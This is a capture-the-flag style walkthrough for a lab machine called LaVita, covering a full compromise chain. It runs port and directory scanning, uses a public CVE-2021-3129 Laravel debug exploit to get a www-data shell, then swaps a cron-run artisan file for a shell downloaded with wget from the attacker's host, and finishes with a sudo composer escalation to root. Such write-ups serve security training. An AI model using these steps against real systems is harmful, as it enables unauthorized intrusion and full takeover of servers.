## IP : 192.168.176.38 

# LaVita

## nmap
```
Open 192.168.176.38:22
Open 192.168.176.38:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: W3.CSS Template
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

## Directory Enumeration
```bash
gobuster dir -u http://192.168.176.38 -w /home/kali/SecLists/Discovery/Web-Content/common.txt
```
```
/.git/logs/        (301) → /.git/logs
/cgi-bin/          (301) → /cgi-bin
/css/              (301) → /css/
/favicon.ico       (200)
/home             (302) → /login
/images/           (301)
/index.php         (200)
/login             (200)
/logout            (405)
/register          (200)
/robots.txt        (200)
/web.config        (200)
```

##  Account Registration & Debug Mode
- **URL:** `http://192.168.176.38/register`  
- **Register**:
  - Name: `admin`
  - E-Mail: `admin@gmail.com`
  - Password: `admin123`
- **Login** and enable debug:
  ```
  APP_DEBUG = [ENABLED]
  ```

##  Laravel Version & Exploit
- **Framework:** Laravel 8.4.0  
- **Vuln:** CVE-2021-3129 (debug RCE via log poisoning)

### Exploitation Steps
```bash
git clone https://github.com/joshuavanderpoll/CVE-2021-3129.git
cd CVE-2021-3129
pip3 install -r requirements.txt
python3 CVE-2021-3129.py --host http://192.168.176.38
# When prompted: execute whoami
# Result: www-data
# Result: Shell as `www-data`

```


## Privilege Escalation
### 1. Sudo Group Membership
```bash
sudo -l
# skunk is in sudo group
```
### 2. Cron Job Enumeration
```bash
./pspy64
# UID=1001 runs:
# /usr/bin/php /var/www/html/lavita/artisan clear:pictures
```
### 3. Replace artisan for Shell
```bash
mv artisan artisan.bak
wget http://192.168.45.196:22/shell.php -O artisan
```
- Wait for cron trigger → shell as `skunk`

### 4. Final Root via Composer
```bash
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
# root shell obtained
```
